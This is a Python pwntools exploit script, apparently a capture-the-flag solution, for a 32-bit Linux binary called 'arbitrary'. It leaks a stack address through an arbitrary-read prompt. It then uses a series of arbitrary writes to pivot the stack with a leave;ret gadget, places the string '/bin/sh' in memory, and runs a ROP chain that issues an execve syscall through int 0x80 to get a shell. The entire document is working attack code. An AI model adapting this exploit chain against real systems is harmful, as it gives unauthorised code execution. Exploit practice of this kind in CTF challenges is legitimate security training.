from pwn import *

context.log_level = "debug"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./arbitrary"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


environ = 0x080F1B44
new_ebp = 0x80EF8A8
leave_ret = 0x8049705

io.sendlineafter("ordering", hex(environ))
io.recvuntil("love 0x", drop=True)
leak = int(io.recvuntil(",", drop=True), 16)
log.success("leak:-----> " + hex(leak))

att_offset = 0xfff61a9c - 0xfff61910
new_att = leak - att_offset
ebp_addr = leak - 0x164

"""
0x08049d5a : int 0x80
0x080b480a : pop eax ; ret
0x08049022 : pop ebx ; ret
0x080647ef : pop ecx ; add al, 0xf6 ; ret

"""
int80 = 0x08049d5a
binsh1 = 0x6e69622f
binsh2 = 0x68732f
binsh = new_ebp+0x200
pop_eax = 0x080b480a
pop_ebx = 0x08049022
pop_ecx = 0x080647ef

thj = [
    (ebp_addr, new_ebp),
    (ebp_addr+4, leave_ret),
    (new_ebp, new_ebp+0x100),
    (binsh, binsh1),
    (binsh+4, binsh2),
    (new_ebp+4*1, pop_ebx),  # rop开始
    (new_ebp+4*2, binsh),
    (new_ebp+4*3, pop_ecx),
    (new_ebp+4*4, 0),
    (new_ebp+4*5, pop_eax),
    (new_ebp+4*6, 0xb),
    (new_ebp+4*7, int80),
]


io.sendlineafter("where would you go?", hex(new_att))
io.sendlineafter("What would you bring there? ", hex(len(thj)+1))


def thj_write(k, v):
    io.sendlineafter("ordering", hex(environ))
    io.sendlineafter("where would you go?", hex(k))
    io.sendlineafter("What would you bring there? ", hex(v))


# ddebug(f"b *{leave_ret}\n b *0x08049914\nb *0x8049920\ncontinue")
ddebug(f"b *{leave_ret}\n continue")
for i in range(len(thj)):
    d = thj[i]
    thj_write(d[0], d[1])

io.interactive()
